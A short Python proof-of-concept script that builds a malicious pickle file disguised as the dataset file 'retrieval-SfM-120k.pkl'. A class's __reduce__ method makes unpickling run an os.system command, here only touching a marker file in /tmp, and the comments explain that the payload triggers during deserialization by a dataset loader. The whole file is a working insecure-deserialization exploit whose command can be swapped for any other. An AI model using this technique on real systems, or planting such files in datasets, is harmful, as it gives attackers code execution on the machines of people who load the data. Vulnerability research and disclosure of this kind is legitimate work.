import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('touch /tmp/DELF_POC_TRIGGERED',))

# We need the pickle to match what TuplesDataset expects structurally, or at least survive until the payload triggers.
# The payload triggers upon deserialization, so even if it crashes right after, the file is created.
# However, to be clean, let's wrap it in the expected dict structure: db['train']['cluster'] etc are accessed later.
# Actually, the payload triggers *during* unpickling of the Exploit object.
payload = {'train': Exploit(), 'val': Exploit()}

with open('retrieval-SfM-120k.pkl', 'wb') as f:
    pickle.dump(payload, f)
